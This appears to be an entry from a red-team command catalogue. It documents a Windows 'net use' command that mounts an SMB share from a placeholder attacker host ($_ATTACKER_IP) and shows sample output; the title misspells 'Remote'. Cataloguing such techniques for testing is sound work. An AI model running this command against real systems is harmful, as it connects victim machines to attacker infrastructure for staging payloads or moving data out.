---
id: d06f9987-4b1b-436c-a36c-ec11beaa29b9
name: Mount a Remove SMB Share
type: command
executor: command_prompt
data: 'net use $_DRIVE: \\$_ATTACKER_IP\$_SHARE'
output: 'C:\>net use X: \\10.10.10.100\files

  The command completed successfully.'
created_at: '2020-03-23T20:53:13.002988+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Mount a Remove SMB Share

```command_prompt
net use $_DRIVE: \\$_ATTACKER_IP\$_SHARE
```

## Expected Output

```
C:\>net use X: \\10.10.10.100\files
The command completed successfully.
```


